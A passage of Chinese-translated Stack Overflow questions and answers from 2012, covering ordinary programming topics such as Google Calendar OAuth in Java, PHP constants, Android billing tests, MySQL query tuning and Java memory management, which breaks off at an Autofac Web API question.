您可以检查一个单词中有多少个大写字符，然后限制它。上面有人给出了像“迈凯轮”这样的名字的例子，这样就可以了。不利的一面是，如果你把最大值放在 3 上，'LOL' 仍然是可能的。可行的方法是将“McLaren”这个词的长度设置为 7，然后将其上限设置为 20%，这使得更长的单词可以有更多的大写字符，但不是全部大写。（没有什么能完全阻止它，但这会让他们更难。）

有趣的是，今天是国际大写锁定日。:)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T11:22:26.300

```
keypress: function(e) {
    var ev = e ? e : window.event;
    if (!ev) {
        return;
    }
    var targ = ev.target ? ev.target : ev.srcElement;
    // get key pressed
    var which = -1;
    if (ev.which) {
        which = ev.which;
    } else if (ev.keyCode) {
        which = ev.keyCode;
    }
    // get shift status
    var shift_status = false;
    if (ev.shiftKey) {
        shift_status = ev.shiftKey;
    } else if (ev.modifiers) {
        shift_status = !!(ev.modifiers & 4);
    }

    // At this point, you have the ASCII code in "which", 
    // and shift_status is true if the shift key is pressed
} 
```

来源——http: [//24ways.org/2007/capturing-caps-lock](http://24ways.org/2007/capturing-caps-lock)

# java - Google Calendar API：以 JSON 格式获取事件

> ID：11243466
> 
> 赞同：0
> 
> 时间：2012-06-28T11:18:49.750
> 
> 标签：java, google-api, google-calendar-api

我已经研究了几个小时的文档，但我就是想不通。我只需要访问我自己的日历。那么我必须采取哪些步骤？身份验证如何工作？

谢谢，乔

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-05T11:51:37.530

I used the this code to access the calendar list i.e., this returns the details of the calendars that I created. I hope it helps. I am using OAuth 2.0 draft 12 and Google Calendar API v3

```
 @RequestMapping(value="/authenticate.do" , method={ RequestMethod.GET , RequestMethod.POST })
    public void authenticate(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {

    List <String> scopes = new LinkedList<String>();
    scopes.add(scope);
    AuthorizationCodeRequestUrl authorize = new  GoogleAuthorizationCodeRequestUrl(client_id, redirect_uri, scopes);
    authorize.setRedirectUri(redirect_uri);
    String authorize_url              = authorize.build();
    log.info(authorize_url);
    response.sendRedirect(authorize_url);
} 
```

The function above takes care of the OAuth authentication and directs the user to the screen where they allow or deny. If they allow they are redirected to this function.

```
@RequestMapping(value="/importCalendar.do", method={ RequestMethod.GET , RequestMethod.POST })
public void importCalendarList(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
    PrintWriter p = response.getWriter();

    String code = request.getParameter("code");
    HttpTransport transport = new NetHttpTransport();
    JsonFactory jsonFactory = new JacksonFactory();

    GoogleTokenResponse res = new GoogleAuthorizationCodeTokenRequest(transport, jsonFactory, client_id, client_secret, code, redirect_uri).execute();
    String accessToken = res.getAccessToken();
    Calendar.Builder builder = new Calendar.Builder(transport, jsonFactory, null);  
    builder.setCalendarRequestInitializer(new CalendarRequestInitializer(accessToken));
    Calendar calendarService = builder.build();
    Calendar.CalendarList.List list = calendarService.calendarList().list();
    list.setOauthToken(accessToken);
    List <CalendarListEntry>list1=list.execute().getItems();
    String id = list1.get(0).getId();
    p.write(id);

    for(CalendarListEntry temp:list1) {
        p.println(temp.getSummary());
        temp.getId();
    } 
} 
```

This function importCalendarList lists the names of all the calendars that the user has. The List of type CalendarListEntry is the Object representation of your calendars. So from getters you can get, for instance, the uniqueid of one of the calendars or the time zone of a calendar.

I wrote this program for knowing calendar api. Before I started writing I went to google api console to set these things up.

**client id, redirect uri, scope and client secret.** Set these up and use them in the program. This just shows the calendar list however you can also get, add, update and delete events from/to a calendar or do all these operations on a calendar itself. The comprehensive documentation for Google Calendar API is found here:

```
https://google-api-client-libraries.appspot.com/documentation/calendar/v3/java/latest/index.html 
```

and one last note. I did this from a web application. Hope this helps.

# ant - 如何使用 Sonar 分析现有 Ant 构建的多插件 Eclipse RCP 项目？

> ID：11243468
> 
> 赞同：2
> 
> 时间：2012-06-28T11:18:57.833
> 
> 标签：ant, build, eclipse-rcp, sonarqube

我们的 Eclipse RCP 项目包含几个插件，并且有一个使用 PDE 构建的现有 Ant 构建。我想将 Sonar 添加到我们的构建管道中。我知道 Sonar 通常支持使用 Sonar Ant Task 分析 Ant 构建。我正在寻找已经为多插件 Eclipse RCP 应用程序完成此操作的人。Sonar 报告应该看起来像一个多模块 Maven 项目的报告。是否有任何模板/构建脚本可供复制？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-06T08:08:01.217

在 SonarSource，我们正在使用 Ant 和 Maven 的组合来分析我们的 Sonar Eclipse 插件。也许这可以帮助你：这里是来源=> [https://github.com/SonarSource/sonar-eclipse](https://github.com/SonarSource/sonar-eclipse)

# android - 无法在 Android 上捕获 java.lang.NullPointerException

> ID：11243469
> 
> 赞同：0
> 
> 时间：2012-06-28T11:18:58.243
> 
> 标签：android, exception-handling, progressdialog

错误：

```
 java.lang.NullPointerException
    at com.lala.Home.hideLoadinganimation(Home.java:969)
    at com.lala.Home.access$4(Home.java:967)
    at com.lala.Home$17.onFinish(Home.java:892)
    at com.loopj.android.http.AsyncHttpResponseHandler.handleMessage   (AsyncHttpResponseHandler.java:180)
    at com.loopj.android.http.AsyncHttpResponseHandler$1.handleMessage(AsyncHttpResponseHandler.java:86)
    at android.os.Handler.dispatchMessage(Handler.java:99)
    at android.os.Looper.loop(Looper.java:130)
    at android.app.ActivityThread.main(ActivityThread.java:3687)
    at java.lang.reflect.Method.invokeNative(Native Method)
    at java.lang.reflect.Method.invoke(Method.java:507)
    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:867)
    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:625)
    at dalvik.system.NativeStart.main(Native Method) 
```

我知道为什么会发生这种情况，就像我的应用程序完成从服务器加载数据并即将隐藏进度对话框一样，用户以某种方式隐藏/退出或转到其他应用程序。

我试图在下面的块中抓住它，但它不起作用。我错过了什么？

```
 private void hideLoadinganimation(boolean asDialog) {
    try {
        if (asDialog) {
            try {
                pDialog.dismiss();
            } catch (Exception e) {
                e.printStackTrace();
                // again, sometimes pDialog is null. I have no idea why as I
                // can't reproduce it.
            }
        } else {
            switcher.showPrevious();
        }
    } catch (Exception ee) {
        ee.printStackTrace();
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:22:02.113

我认为你`pDialog`是空的。

尝试

```
if(null!=pDialog && pDialog.isshowing()){

      pDialog.dismiss();

} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T11:22:36.533

改变

```
 pDialog.dismiss(); 
```

至

```
if(pDialog!=null)
{
  pDialog.dismiss();
} 
```

但是您需要弄清楚为什么它会变为空

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T12:07:24.957

在 Dheeresh Singh 发表评论后，我去检查该行并注意到错误日志来自该应用程序的旧版本。虽然我在有新版本时强制用户更新，但有几个用户如何绕过它。很抱歉给您带来麻烦。

我应该花更多时间在上面并检查详细信息。

# google-app-engine - 使用 Objectify 保存密钥

> ID：11243472
> 
> 赞同：0
> 
> 时间：2012-06-28T11:19:09.350
> 
> 标签：google-app-engine, objectify

将 Objectify 实体保存到 Appengine 数据存储区时，是否可以保存自定义数据存储区“密钥”而不是自动生成的密钥哈希？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T13:57:35.480

您可以使用任何 String 或 long 并将其注释为键，如下所示：

```
import javax.persistence.Id;

public class MyEntityClass {
  @Id
  private String myCustomKey;

  public MyEntityClass(String keyId) {
    this.myCustomKey = keyId;
  }
} 
```

然后您可以使用以下方法再次检索它：

```
MyEntityClass object = ofy().get(new Key<MyEntityClass>(MyEntitiyClass.class, "specificKeyId")); 
```

# php - 在php中使用未定义的常量错误

> ID：11243474
> 
> 赞同：-2
> 
> 时间：2012-06-28T11:19:10.937
> 
> 标签：php, constants, undefined

当我将代码切换到另一个系统时，我收到错误（下面提到的代码），

配置：

操作系统：Windows 7 php 服务器：Xampp

请帮我解决这个问题。提前致谢。

代码：

```
<?php
class settings{
    public $theme;
    public $db_pf;

    function __construct(){
        $this->theme="default";
        $this->db_pf="task_";
        $this->paths();
        $this->abbr();
        $this->errors();

        $this->enable_db_config();
    }
    function paths(){
        define(ROOT,$_SERVER['DOCUMENT_ROOT']);
        define(BP,"/task/");
        define(ABSPATH,"/task/ta-admin/");
        define(ADMPATH,"/task/administrator/");
        define(INCLUDE_PATH,ABSPATH."includes/");
        define(MODULE_PATH,ABSPATH."modules/");
        define(CONTENT_PATH,ABSPATH."contents/");
        define(THEME_PATH,ABSPATH."templates/".$this->theme."/");
        define(STYLE_PATH,THEME_PATH."styles/");
        define(IMAGE_PATH,THEME_PATH."images/");
        define(JS_PATH,BP."assets/js/");
        define(JQ_PATH,BP."assets/jq/");
    }
    function enable_db_config(){
        include(ROOT.BP."ta-includes/class-db-config.php");
    }
    function abbr(){
        define(task_title,"Admin-Quit Tasker-");
        define(LOGIN_TITLE," Administrator Login...");
        define(SLOGAN,"Enabling Solutions to your Tasks...");
    }
    function errors(){
        define(NOTFOUND,"Page not found");
        define(GOBACK," please press ok to go back...");    
    }
}
$obj_settings=new settings();
?> 
```

**错误：**

```
Notice: Use of undefined constant ROOT - assumed 'ROOT' in C:\xampp\htdocs\task\ta-includes\class-settings.php on line 14

Notice: Use of undefined constant BP - assumed 'BP' in C:\xampp\htdocs\task\ta-includes\class-settings.php on line 15

Notice: Use of undefined constant ABSPATH - assumed 'ABSPATH' in C:\xampp\htdocs\task\ta-includes\class-settings.php on line 16

Notice: Use of undefined constant INCLUDE_PATH - assumed 'INCLUDE_PATH' in C:\xampp\htdocs\task\ta-includes\class-settings.php on line 17

Notice: Use of undefined constant CONTENT_PATH - assumed 'CONTENT_PATH' in C:\xampp\htdocs\task\ta-includes\class-settings.php on line 18

Notice: Use of undefined constant THEME_PATH - assumed 'THEME_PATH' in C:\xampp\htdocs\task\ta-includes\class-settings.php on line 19

Notice: Use of undefined constant STYLE_PATH - assumed 'STYLE_PATH' in C:\xampp\htdocs\task\ta-includes\class-settings.php on line 20

Notice: Use of undefined constant JS_PATH - assumed 'JS_PATH' in C:\xampp\htdocs\task\ta-includes\class-settings.php on line 21

Notice: Use of undefined constant JQ_PATH - assumed 'JQ_PATH' in C:\xampp\htdocs\task\ta-includes\class-settings.php on line 22 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-28T11:22:17.753

您的常量需要是字符串。因此，您必须将它们“包装”在这样的引号中：

```
define('ROOT',$_SERVER['DOCUMENT_ROOT']);
       ^    ^ 
```

如有疑问，请始终检查[Manual](http://www.php.net/manual/en/index.php)，在这种情况下[为 define()](http://php.net/manual/en/function.define.php)

**补充：**
在函数中定义常量也是，我发现，有点“**狡猾**”。如果您坚持不将它们移动到一`config`开始就加载的另一个（例如）文件，那么至少将它们从类结构中取出。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T11:22:48.417

我认为您误解了定义和常量是什么/从对象中以这种方式定义常量并没有真正意义。

也许这是您正在做的更好的方法：

[http://php.net/manual/en/language.oop5.constants.php](http://php.net/manual/en/language.oop5.constants.php)

或者，使用定义设置项目的最常见用法是使用 si9mple 设置或配置文件...

# android - android 应用内计费沙盒

> ID：11243478
> 
> 赞同：7
> 
> 时间：2012-06-28T11:19:37.257
> 
> 标签：android, testing, sandbox, billing, in-app

我正在开发一个简单的应用内计费库。它适用于谷歌的静态响应，但现在我想用真正的应用内产品测试这个库。

我创建了一个测试帐户，我正在尝试购买产品，但 google Play 要求我提供信用卡。有没有什么方法可以在不使用真实信用卡（沙盒环境、假信用卡等）的情况下测试应用内计费？

我在这里读到过，唯一的测试方法是使用带有测试帐户的真实信用卡（因此您不必支付谷歌税），一旦您购买了产品，再次退款，但似乎没有是一种非常“开发人员友好”的方式。

谢谢。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-06-28T11:22:48.443

不，它绝对**糟透了**

您必须使用真实的信用卡，然后进入 Google Play ，选择**查看商家帐户**并点击个人订单然后**退款**以取回您的钱。

对不起！

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-05-16T13:36:20.483

截至今天（或昨天），谷歌终于允许对应用内购买进行“沙盒”测试，它完成了应用内购买的所有步骤，除了信用卡的实际收费。尽管您可能必须像以前一样等待取消/退款。

更多信息[在这里](https://developer.android.com/google/play/billing/billing_testing.html?rd=1#test-purchases)和[这里](https://developer.android.com/google/play/billing/billing_testing.html?rd=1#billing-testing-test)

从我的开发人员控制台获得此信息。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-19T02:40:42.840

...并添加到 Blundell 的答案中，退款将需要将近 6 小时才能发布，然后您可能希望在尝试购买前再给它 6 小时......否则......否则，什么？哦，我不知道，像“你已经拥有这个项目”之类的错误/故障/我存在的祸根

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-08-16T06:07:09.580

您可以使用测试帐户测试应用内购买订阅。作为参考，请通过链接 - 您可以通过将您的测试人员帐户添加到游戏控制台来使用沙盒测试。转到播放控制台主屏幕--> 设置--> 搜索许可证测试员--> 在此处添加您的测试员电子邮件 ID。然后转到您的应用程序版本-> 转到您的 beta/alpha 版本。点击管理测试人员并与测试人员共享选择加入 URL 以接受邀请。

[https://cheesecakelabs.com/blog/google-play-iap-first-setup-test-sandbox/](https://cheesecakelabs.com/blog/google-play-iap-first-setup-test-sandbox/)

# javascript - 是否可以使用 XHTML、CSS 和 JavaScript 编写跨平台桌面应用程序？

> ID：11243480
> 
> 赞同：5
> 
> 时间：2012-06-28T11:19:40.350
> 
> 标签：javascript, css, xhtml, desktop-application

是否可以使用 XHTML（或 HTML）、CSS 和 JavaScript 编写跨平台桌面应用程序？

如果答案是肯定的，如何运行这个应用程序？我应该使用 Firefox 之类的浏览器运行它吗？

**注意**：目前 Windows 支持[HTML 应用程序](http://en.wikipedia.org/wiki/HTML_Application)。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T11:55:39.757

您正在寻找的似乎是[Open Web Apps](https://developer.mozilla.org/en/Apps)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-28T11:24:42.790

HTA 是真正的老技术。

尝试使用 Titanium (Appcelerator) 等工具。它们是在 APP 中呈现 HTML 内容的工具。因此，从外部，您将运行一个可执行文件，但在内部，它正在加载一个 HTML 文件。

现在，许多应用程序都在使用相同的原理。安卓版 Facebook 就是一个最好的例子

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-28T13:37:52.633

是的。使用 HTML5。

另一个答案的解决方案很棒，但通常他们假设用户连接到互联网以拥有处理数据的服务器端。

但是可以使用带有 HTML5 的 Open Web Apps（如 ZER0 建议的那样），它对[离线 Web 应用程序](http://www.w3.org/TR/offline-webapps/)有很多支持。

不过，请注意它。甚至 HTML5 也假设最终用户将拥有某种类型的 Internet 连接，并且离线功能被视为“缓存”。所以，我不确定这个解决方案是否足以满足所有需求，因为我不知道 HTML5 为离线应用程序提供了多少空间

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-28T11:22:22.890

如果客户端 JavaScript 和/或 HTML/CSS 黑客程序完成了您希望它完成的任务，是的，并且确实使用像 Firefox 这样的用户代理。

# android - 是否可以监控特定的已知电子邮件帐户？

> ID：11243481
> 
> 赞同：0
> 
> 时间：2012-06-28T11:19:41.427
> 
> 标签：android, android-intent

例如，如果我知道电子邮件帐户，`abc.xyz@pqr.com`我可以监控该特定帐户的电子邮件附件下载。其他需求

1.  我想要下载附件的位置，以便我可以控制下载的东西。
2.  控制下载文件的意义加密。

可能吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T11:37:54.173

> 可能吗？

如果您编写自己的电子邮件客户端来下载附件，是的。或者，如果您找到一些为此提供 API 的电子邮件客户端，那么可以。不过，一般来说，这是不可能的。

# php - 带有消息“SQLSTATE [08004] [1040] 连接过多的 PDOException”

> ID：11243483
> 
> 赞同：0
> 
> 时间：2012-06-28T11:19:42.707
> 
> 标签：php, mysql, pdo

我的 php 文件中有错误。错误显示“PDOException”，消息为“SQLSTATE[08004] [1040] 连接过多”。我环顾四周，人们说我应该更改 mysql 服务器上的 max_connections。我这样做了，但它不起作用。

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T11:28:29.873

您应该使用非持久连接。[PHP手册中的](http://am.php.net/manual/en/features.persistent-connections.php)详细信息

# java - shell进程java同步

> ID：11243486
> 
> 赞同：0
> 
> 时间：2012-06-28T11:20:07.180
> 
> 标签：java, shell, io, broken-pipe

我想从 java 程序运行 shell 脚本。这个 shell 脚本调用一个需要一个大文件作为资源的系统库。

我的 java 程序为文档中的每个单词调用此脚本。如果我使用 Runtime.exec() 一次又一次地调用此脚本，则所花费的时间非常长，因为资源加载需要大量时间。

为了克服这个问题，我想编写如下的 shell 脚本（使其在后台连续运行）：

* * *

```
count=0

while count -lt 10 ; do

  read WORD

  //execute command on this line

done 
```

* * *

我需要在我的 java 程序中检索命令的输出并进一步处理它。我应该如何编写 I/O 操作来完成这个任务？

我尝试将单词写入进程的输出流并从进程的输入流中读回输出。但这不起作用并引发损坏的管道异常。

* * *

```
try {

    parseResult = Runtime.getRuntime().exec(parseCommand);

    parsingResultsReader = new BufferedReader(new InputStreamReader (parseResult.getInputStream()));

    errorReader = new BufferedReader(new InputStreamReader (parseResult.getErrorStream()));

    parseResultsWriter = new BufferedWriter(new OutputStreamWriter((parseResult.getOutputStream())));

} catch (IOException e) {

            e.printStackTrace();

} 
```

* * *

```
parseResultsWriter.write(word);

parseResultsWriter.flush();

while ((line = parsingResultsReader.readLine()) != null) {

     // capture output in list here

} 
```

* * *

请帮助解决这个问题

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T12:34:59.777

```
//execute command on this line 
```

这个命令是一个单独的程序吗？然后它将为每个单词启动，因此您将只摆脱轻量级的 shell 进程。您必须学习如何一次对多个单词运行重量级命令。

# query-optimization - 冗长的查询优化

> ID：11243487
> 
> 赞同：0
> 
> 时间：2012-06-28T11:20:07.910
> 
> 标签：query-optimization

有没有办法优化这个查询目前这个查询的执行时间是**585** 在这个查询中只有两个表被使用。一个是包含球员信息的球员详细信息表，另一个是corn_player_data 包含得分记录

```
SELECT
  t.players_id,
  t.players_name,
  t.added_date,
  t.total_death  AS total_death,
  t.total_king   AS total_king,
  GROUP_CONCAT(t.week_number) AS week_number,
  GROUP_CONCAT(t.death) AS Death,
  GROUP_CONCAT(t.King) AS King
FROM (SELECT
        p.id             AS players_id,
        p.name           AS players_name,
        cpd.added_date   AS added_date,
        cpd4.total_death AS total_death,
        cpd5.total_king  AS total_king,
        WEEK(cpd.added_date) AS week_number,
        GROUP_CONCAT(cpd.added_date) AS NewDate,
        COUNT(cpd3.result) AS death,
        COUNT(cpd2.result) AS King
      FROM players AS p
        LEFT JOIN cron_players_data AS cpd
          ON cpd.player_id = p.id
        LEFT JOIN cron_players_data cpd2
          ON cpd2.player_id = p.id
            AND cpd2.result = 1
            AND cpd2.status = 1
            AND cpd2.added_date = cpd.added_date
        LEFT JOIN cron_players_data cpd3
          ON cpd3.player_id = p.id
            AND cpd3.result = 2
            AND cpd3.status = 1
            AND cpd3.added_date = cpd.added_date
        LEFT JOIN (SELECT
                     cron_p_d.player_id,
                     COUNT(cron_p_d.result) AS total_death
                   FROM cron_players_data cron_p_d
                   WHERE cron_p_d.result = 2
                       AND cron_p_d.status = 1
                   GROUP BY (cron_p_d.player_id)) AS cpd4
          ON cpd4.player_id = p.id
        LEFT JOIN (SELECT
                     cro_p_d.player_id,
                     COUNT(cro_p_d.result) AS total_king
                   FROM cron_players_data cro_p_d
                   WHERE cro_p_d.result = 1
                       AND cro_p_d.status = 1
                   GROUP BY (cro_p_d.player_id)) AS cpd5
          ON cpd5.player_id = p.id
      GROUP BY (p.id),WEEK(cpd.added_date)) AS t
GROUP BY t.players_id

TABLE              CREATE TABLE                                             
-----------------  ---------------------------------------------------------
cron_players_data  CREATE TABLE `cron_players_data` (                       
                     `id` INT(11) NOT NULL AUTO_INCREMENT,                  
                     `cat_id` BIGINT(30) DEFAULT '0',                       
                     `sub_cat_id` BIGINT(30) DEFAULT '0',                   
                     `team_id` BIGINT(30) DEFAULT '0',                      
                     `player_id` BIGINT(30) DEFAULT '0',                    
                     `status_team` VARCHAR(225) DEFAULT NULL,               
                     `result` BIGINT(30) DEFAULT '0',                       
                     `home` BIGINT(30) UNSIGNED DEFAULT '0',                
                     `guest` BIGINT(30) UNSIGNED DEFAULT '0',               
                     `mvp` BIGINT(30) DEFAULT '0',                          
                     `oscar` BIGINT(30) DEFAULT '0',                        
                     `wam` BIGINT(30) DEFAULT '0',                          
                     `crown` BIGINT(30) DEFAULT '0',                        
                     `kiss` BIGINT(30) DEFAULT '0',                         
                     `slap` BIGINT(30) DEFAULT '0',                         
                     `bomb` BIGINT(30) DEFAULT '0',                         
                     `status` TINYINT(1) DEFAULT '0',                       
                     `added_date` DATE DEFAULT NULL,                        
                     PRIMARY KEY  (`id`)                                    
                   ) ENGINE=MYISAM AUTO_INCREMENT=265 DEFAULT CHARSET=utf8  

TABLE    CREATE TABLE                                                                              
-------  -----------------------------------------
players  CREATE TABLE `players` (                                                                  
           `id` INT(11) NOT NULL AUTO_INCREMENT,                                                   
           `cat_id` BIGINT(30) DEFAULT '0',                                                        
           `sub_cat_id` BIGINT(30) DEFAULT '0',                                                    
           `team_id` BIGINT(30) DEFAULT '0',                                                       
           `name` VARCHAR(225) DEFAULT NULL,                                                       
           `class_name` VARCHAR(225) DEFAULT NULL,                                                 
           `image` VARCHAR(225) DEFAULT NULL,                                                      
           `added_date` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,  
           PRIMARY KEY  (`id`)                                                                     
         ) ENGINE=MYISAM AUTO_INCREMENT=147 DEFAULT CHARSET=utf8 
```

输出将是这样的

```
players_id  players_name    added_date  total_death total_king  week_number Death   King
81  Mario Chalmers  2012-06-08  6   7   23,24,25,26 2,3,1,0 0,2,4,1
82  Udonis Haslem   2012-06-09  2   7   23,24,25,26 0,1,0,1 1,1,4,1
83  James Jones 2012-06-09  10  3   23,24,25,26 0,7,3,0 1,0,1,1
84  Chris Bosch 2012-06-09  8   4   23,24,25,26 1,4,2,1 0,2,2,0
85  Dwayne Wade 2012-06-09  6   4   23,24,25,26 1,3,1,1 0,2,2,0
86  Eddie House 2012-06-09  5   4   23,24,25,26 0,3,2,0 1,1,1,1
87  Joel Anthony    2012-06-09  6   6   23,24,25,26 1,3,1,1 1,2,3,0
88  Mike Bibby  2012-06-08  5   9   23,24,25,26 0,3,1,1 2,3,4,0
89  Mike Miller 2012-06-09  7   8   23,24,25,26 1,4,1,1 1,2,4,1
90  Erick Dampier   2012-06-09  11  1   23,24,25,26 2,5,2,2 0,0,1,0
91  Lebron James    2012-06-09  7   4   23,24,25,26 1,4,1,1 0,2,2,0
92  Juwan Howard    2012-06-08  5   4   23,24,25,26 1,2,1,1 0,1,3,0 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-29T10:13:02.047

你用的是mysql还是sqlserver？那些创建语句不适用于 MSSQL。我猜你正在使用 mySQL，并没有用它做很多工作，但这些帖子可以帮助你。

[MySql BigInt(20) 与 Int(20)](https://stackoverflow.com/questions/3135804/types-in-mysql-bigint20-vs-int20-etcc) [SQL Server BigInt 或 Int](https://stackoverflow.com/questions/2124631/sql-server-int-or-bigint-database-table-ids)

基本上（但未经测试）我猜 Bigint 值不值得，因为这些列上的值非常小。你浪费了很多空间和索引，所有相关的东西也都占用了很多空间。尝试切换到适合您情况的最小数字类型（small int，tinyint？）

# matlab - matlab中的贝叶斯分类

> ID：11243490
> 
> 赞同：3
> 
> 时间：2012-06-28T11:20:25.397
> 
> 标签：matlab, machine-learning, classification, bayesian

我有 50 张图像，并通过将它们分为两类（皮肤和伤口）并存储它们各自的绿色通道值来创建每个图像的绿色通道数据库。

另外，我有 1600 个伤口像素值和 3000 个皮肤像素值。

现在我必须在 matlab 中使用贝叶斯分类来使用我拥有的数据库对新（测试）图像中的皮肤和伤口像素进行分类。我已经尝试过内置命令`diaglinear`，但结果很差，导致很多错误分类。

另外，我不知道它是否是正态分布，所以不能使用高斯估计来找到数据的条件概率密度函数。

有没有办法执行像素级分类？

如果问题的任何部分不清楚，请提出。

我正在寻求帮助。提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-01T17:14:03.417

如果您真的想使用逐像素分类（很简单，但为什么不呢？）尝试使用 hist()/imhist() 探索像素值分布。它可能会为您提供有关高斯性的线索...其次，如果您有曲线拟合工具箱（或再次手动执行），您可以使用 fit() 手动将您的值拟合到一些适当的曲线（高斯？）。然后将曲线乘以伤口/皮肤的概率，如果你喜欢它是 MAP 分类器，最后找到它们的交点。维拉！你有你的描述值 V. if Xi skin else -> 伤口

# java - 对象是堆内存中的存储和删除

> ID：11243495
> 
> 赞同：0
> 
> 时间：2012-06-28T11:20:46.630
> 
> 标签：java, memory, memory-management

任何人都可以向我解释如何从 Java 的堆内存中存储和删除对象。我正在寻找更多信息，而不仅仅是：

> `Object`没有参考时删除遗嘱

例如：

```
class Heap
{
    void add(int a, int b)
    {
        System.out.println(a+b);
    }

    public static void main(String ar[])
    {
        Heap obj=new Heap();
        obj.add(4,3);
        obj.add(5,5);
    }
} 
```

这里是如何`obj`和`a`, `bJ 在 java 内存中分配的。JVM什么时候会从内存中删除？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-28T11:28:16.443

简单地说：

1.  `obj``new Heap()`调用时在堆上分配。
2.  `a`并且`b`两者都在堆栈上分配（原始类型，方法参数），内存将在从`add`.
3.  `obj`只要垃圾收集器在执行结束后运行，就会从堆中删除`main`（规范不保证 GC 会在任何给定时间，它会自行确定何时是正确的时间，尽管几乎是堆满的可能是一个非常常见的触发器） - 但在这种情况下，由于程序将终止，它会在从`main`.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-28T11:25:23.400

Heap 对象将在堆内创建。这将包含类和成员变量中的方法。当您调用一个方法时，该方法将被加载到堆栈中，并在执行该方法后被 jvm 自动丢弃。

**内存的堆栈**部分包含方法、局部变量和引用变量。

**堆**部分包含对象（也可能包含引用变量）。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-06-28T11:25:43.510

嗯... a 和 b 根本没有在堆上分配。

它们在堆栈上用于传递给函数。一旦执行离开`add()`，变量`a`和`b`不能再使用，将被 jvm 删除。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-06-28T11:49:32.930

当您[运行程序](http://www.artima.com/insidejvm/ed2/jvm.html)时：

1.  在`main`方法执行之前，JVM会为你分配一个新的执行线程，这个线程（称为主线程）会有一个与之关联的栈，栈是放置局部变量和临时数据的地方。
2.  在堆栈中，一个新框架将与 main 方法相关联。
3.  该`obj`引用将在主方法堆栈帧中创建。
4.  当您调用`new Heap()`JVM 时，JVM 将尝试在堆内存区域中为您的对象分配内存。如果成功，它将为您的局部变量分配一个对象引用，如果失败，它可能会尝试为运行垃圾收集器的对象腾出空间，如果仍然无法为它找到足够的空间`OutOfMemoryError`并抛出。
5.  当您`add(int, int)`在内存引用上调用该方法时，JVM 将首先取消引用该指针以获得对堆中实际对象的访问权，如果失败`NullPointerException`将抛出一个，否则它将在调用的对象中查找要执行的方法方法区（类信息所在的内存区域）。
6.  如果找到该方法，则在当前正在执行的线程的堆栈中创建一个新的帧，并将执行的控制权转移给新的方法。
7.  两个变量放置在方法堆栈框架 a 和 b 中，它们使用您作为参数传递的值的副本进行初始化（即 4、3）。
8.  该方法执行它所做的，当它完成时，当前堆栈帧被销毁，执行控制返回到前一帧。
9.  由于您再次调用方法 add，因此重复该过程。
10.  该`main`方法结束，其堆栈帧被删除。现在`obj`引用丢失了，不再有办法访问堆中的对象。它指向的对象现在无法进行垃圾收集。
11.  JVM 进程终止并释放所有相关资源。可能在这种情况下，垃圾收集实际上永远不会运行，但如果它运行了，那么堆中的对象所占用的内存将被回收。

# asp.net-mvc-3 - 将 Autofac 与 ASP.NET Web API RC 和 ASP.NET MVC3 一起使用时出错

> ID：11243500
> 
> 赞同：1
> 
> 时间：2012-06-28T11:21:11.903
> 
> 标签：asp.net-mvc-3, asp.net-web-api, autofac

我使用 NuGet 将 ASP.NET Web API RC 添加到我的 MVC3 项目中：

```
Install-Package AspNetWebApi 
```

然后我配置了它。在`Global.asax.cs`：

```
// configure regular controllers
var configuration = GlobalConfiguration.Configuration;
var container = Bootstrapper.ConfigureContainer(configuration);
containterProvider = new ContainerProvider(container);
DependencyResolver.SetResolver(new AutofacDependencyResolver(container));

// Set the dependency resolver implementation for Web API.
var resolver = new AutofacWebApiDependencyResolver(container);
configuration.DependencyResolver = resolver; 
```

在`Boostrapper.ConfigureContainer(...)`我补充说：

```
// I register my types as InstancePerLifetimeScope() 
// but I also tried .InstancePerHttpRequest().InstancePerApiRequest()
// to the same end
builder.RegisterType<SomeService>()
    .AsImplementedInterfaces().InstancePerLifetimeScope();
// Register API controllers using assembly scanning.
builder.RegisterApiControllers(Assembly.GetExecutingAssembly());
builder.RegisterWebApiFilterProvider(config); 
```

这在[此处](http://alexmg.com/post/2012/03/08/Autofac-ASPNET-Web-API-%28Beta%29-Integration.aspx)和[此处](http://alexmg.com/post/2012/06/07/Autofac-262859-and-ASPNET-MVC-4-RC-Integrations-Released.aspx)进行了描述。

我还使用 NuGet更新了`Autofac`、`Autofac.Web`、包并安装了包。`Autofac.Mvc3``Autofac.WebApi`

使用此配置，我尝试运行我的 ApiController 并收到以下错误：

